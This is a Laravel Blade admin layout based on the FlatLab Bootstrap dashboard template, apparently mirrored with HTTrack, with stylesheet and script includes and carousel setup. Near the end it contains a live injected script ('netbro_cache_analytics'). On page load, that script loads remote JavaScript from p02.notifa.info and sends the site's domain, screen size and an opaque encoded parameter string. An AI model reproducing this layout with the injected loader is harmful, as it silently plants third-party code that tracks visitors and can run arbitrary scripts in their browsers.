<!DOCTYPE html>
<html lang="en">
  
<!-- Mirrored from thevectorlab.net/flatlab-4/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 03 Aug 2019 16:45:24 GMT -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="Mosaddek">
    <meta name="keyword" content="FlatLab, Dashboard, Bootstrap, Admin, Template, Theme, Responsive, Fluid, Retina">
    <link rel="shortcut icon" href="img/favicon.html">

    <title>Backend</title>

    <!-- Bootstrap core CSS -->
    <link href="{{url('admin/css/bootstrap.min.css')}}" rel="stylesheet">
    <link href="{{url('admin/css/bootstrap-reset.css')}}" rel="stylesheet">
    <!--external css-->
    <link href="{{url('admin/assets/font-awesome/css/font-awesome.css')}}" rel="stylesheet" />
    <link href="{{url('admin/assets/jquery-easy-pie-chart/jquery.easy-pie-chart.css')}}" rel="stylesheet" type="text/css" media="screen"/>
    <link rel="stylesheet" href="{{url('admin/css/owl.carousel.css')}}" type="text/css">

     <!--dynamic table-->
    <link href="{{url('admin/assets/advanced-datatable/media/css/demo_page.css')}}" rel="stylesheet" />
    <link href="{{url('admin/assets/advanced-datatable/media/css/demo_table.css')}}" rel="stylesheet" />
    <link rel="stylesheet" href="{{url('admin/assets/data-tables/DT_bootstrap.css')}}" />

    <!--right slidebar-->
    <link href="{{url('admin/css/slidebars.css')}}" rel="stylesheet">

    <!-- Custom styles for this template -->

    <link href="{{url('admin/css/style.css')}}" rel="stylesheet">
    <link href="{{url('admin/css/style-responsive.css')}}" rel="stylesheet" />

    @section('css')
    @show
  </head>

  <body class="light-sidebar-nav">

  <section id="container">
     
     @include('admin.header')

     @include('admin.sidebar')

     @yield('content')

     @include('admin.footer')
     
  </section>

    <!-- js placed at the end of the document so the pages load faster -->
    <script src="{{url('admin/js/jquery.js')}}"></script>
    <script src="{{url('admin/js/bootstrap.bundle.min.js')}}"></script>
    <script class="include" type="text/javascript" src="{{url('admin/js/jquery.dcjqaccordion.2.7.js')}}"></script>
    <script src="{{url('admin/js/jquery.scrollTo.min.js')}}"></script>
    <script src="{{url('admin/js/jquery.nicescroll.js')}}" type="text/javascript"></script>
    <script src="{{url('admin/js/jquery.sparkline.js')}}" type="text/javascript"></script>
    <script src="{{url('admin/assets/jquery-easy-pie-chart/jquery.easy-pie-chart.js')}}"></script>
    <script src="{{url('admin/js/owl.carousel.js')}}" ></script>
    <script src="{{url('admin/js/jquery.customSelect.min.js')}}" ></script>
    <script src="{{url('admin/js/respond.min.js')}}" ></script>

    <script type="text/javascript" language="javascript" src="{{url('admin/assets/advanced-datatable/media/js/jquery.dataTables.js')}}"></script>
    <script type="text/javascript" src="{{url('admin/assets/data-tables/DT_bootstrap.js')}}"></script>

    <!--right slidebar-->
    <script src="{{url('admin/js/slidebars.min.js')}}"></script>

    <!--common script for all pages-->
    <script src="{{url('admin/js/common-scripts.js')}}"></script>

    <!--dynamic table initialization -->
    <script src="{{url('admin/js/dynamic_table_init.js')}}"></script>

    <!--script for this page-->
    <script src="{{url('admin/js/sparkline-chart.js')}}"></script>
    <script src="{{url('admin/js/easy-pie-chart.js')}}"></script>
    <script src="{{url('admin/js/count.js')}}"></script>

  <script>

      //owl carousel

      $(document).ready(function() {
          $("#owl-demo").owlCarousel({
              navigation : true,
              slideSpeed : 300,
              paginationSpeed : 400,
              singleItem : true,
			  autoPlay:true

          });
      });

      //custom select box

      $(function(){
          $('select.styled').customSelect();
      });

      $(window).on("resize",function(){
          var owl = $("#owl-demo").data("owlCarousel");
          owl.reinit();
      });

  </script>

  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2vI5e5T8vRcxTz0OyNvoZIV5%2b6atNt9%2fU7KWGN%2b3EG2BaqVsjkztgWaKgpmH%2foJ1BK9jj5igdP%2fTE0kYTxFfWdZJAheXj2i6xy7wyrwtFxrTrFwlUzTLN%2fOhuUFWgxbTIPgdae3eJgFYUVtresktd%2btiwVBmuAOdjQ40Cb596zDtmt%2fje6NYZi1RBWKx0UUmhgHryyen%2fyzaz008ibeSyT9SnHxtQ9t28lcicbiYSsk%2b1JiAK5nccxXB1QGsIVOcFJ49jCYRAwkyUPwHtD55yWcsWjmOhexs3CEFhr%2f7nwKUDivTgJyrP%2fFeDyApl%2bjMNUtsU1Y2QhlNSGTACDodcNMxQ134eYcitwbQm70fUyq2ANaiC8%2bAn6lUYezLnMesa8RHdjbAuWWbP9xX6jrJ%2b2frejYTEBcgT780fQ9eEIQoui3AeRDeENcajVTkDhvxNjAju1Me84nREeLODrhBgL5NbDRd4jPYn" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
 @section('js')
 
  @show
</body>

<!-- Mirrored from thevectorlab.net/flatlab-4/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 03 Aug 2019 16:48:16 GMT -->
</html>
